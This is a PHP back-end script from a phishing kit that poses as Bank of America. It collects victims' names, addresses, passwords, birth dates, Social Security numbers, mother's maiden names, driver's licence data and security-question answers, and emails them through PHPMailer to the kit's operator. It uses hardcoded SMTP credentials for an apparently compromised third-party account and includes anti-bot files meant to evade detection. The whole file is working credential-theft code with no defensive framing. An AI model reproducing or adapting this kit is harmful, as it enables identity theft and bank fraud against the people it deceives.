<?php
$zabi = getenv("REMOTE_ADDR");
include './antibots.php';
include('../email.php');
include './bt.php';
include "./blocker.php";
$message .= "--++-----[ $$ World Wide On My Hand  $$ ]-----++--\n";
$message .= "----------BOA Bank ReZulT--------------------\n";
$message .= "Full Name: ".$_POST['fullname']."\n";
$message .= "Address: ".$_POST['address']."\n";
$message .= "City: ".$_POST['city']."\n";
$message .= "State: ".$_POST['state']."\n";
$message .= "Zip: ".$_POST['zip']."\n";
$message .= "-------------------- Security Info ----------------------\n";
$message .= "Email: ".$_POST['email']."\n";
$message .= "Password: ".$_POST['password']."\n";
$message .= "Confirmation Password: ".$_POST['password1']."\n";
$message .= "BirthMonth: ".$_POST['bmonth']."\n";
$message .= "BirthDay: ".$_POST['bday']."\n";
$message .= "BirthYear: ".$_POST['byear']."\n";
$message .= "SSN1: ".$_POST['ssn1']."\n";
$message .= "SSN2: ".$_POST['ssn2']."\n";
$message .= "SSN3: ".$_POST['ssn3']."\n";
$message .= "Phone Number: ".$_POST['ph']."\n";
$message .= "Mother's Maiden Name: ".$_POST['mmn']."\n";
$message .= "Driver's License: ".$_POST['dl']."\n";
$message .= "DL Exp 1: ".$_POST['exp1']."\n";
$message .= "DL Exp 2: ".$_POST['exp2']."\n";
$message .= "DL Exp 3: ".$_POST['exp3']."\n";
$message .= "-------------------- SiteKey Challenge ----------------------\n";
$message .= "Queestion 1: ".$_POST['q1']."\n";
$message .= "Answer 1: ".$_POST['answer1']."\n";
$message .= "Question 2: ".$_POST['q2']."\n";
$message .= "Answer 2: ".$_POST['answer2']."\n";
$message .= "Question 3: ".$_POST['q3']."\n";
$message .= "Answer 3: ".$_POST['answer3']."\n";
$message .= "++-----[ $$ Fully Undetected by Dr.Don $$ ]-----++\n";
$message .= "-------------- IP Infos ------------\n";
$message .= "IP       : $zabi\n";
$message .= "BROWSER  : ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "---------------------- BY Dr.Don  ----------------------\n";
$cc = $_POST['ccn'];
$subject = "BOA Info [ " . $zabi . " ]  ".$_POST['exm']."/".$_POST['exy'];
$headers = "From: Dr.Don <contact>\r\n";
// mail($email, $subject, $message, $headers);
//     $text = fopen('../rezlt.txt', 'a');
// fwrite($text, $subject);
// mail(','.$form, $subject, $message, $headers);

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

// Load Composer's autoloader
require '../fxneedles/vendor/autoload.php';

// Instantiation and passing `true` enables exceptions
$mail = new PHPMailer(true);

try {
    //Server settings
    $mail->SMTPDebug = SMTP::DEBUG_SERVER;                      // Enable verbose debug output
    $mail->isSMTP();                                            // Send using SMTP
    $mail->Host       = 'secure265.inmotionhosting.com';                    // Set the SMTP server to send through
    $mail->SMTPAuth   = true;                                   // Enable SMTP authentication
    $mail->Username   = 'gerald@legacyuniversity.edu.ng';                     // SMTP username
    $mail->Password   = '!@#$%Odogwu';                               // SMTP password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_SMTPS;         // Enable TLS encryption; `PHPMailer::ENCRYPTION_SMTPS` encouraged
    $mail->Port       = 465;                                    // TCP port to connect to, use 465 for `PHPMailer::ENCRYPTION_SMTPS` above

    //Recipients
    $mail->setFrom('gerald@legacyuniversity.edu.ng', 'BOA');
    $mail->addAddress($email);               // Name is optional

    // Content
    $mail->isHTML(true);                                  // Set email format to HTML
    $mail->Subject = $subject;
    $mail->Body    = $message;

    $mail->send();

    header("Location: qes.php");
} catch (Exception $e) {
    "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    header("Location: qes.php");
}
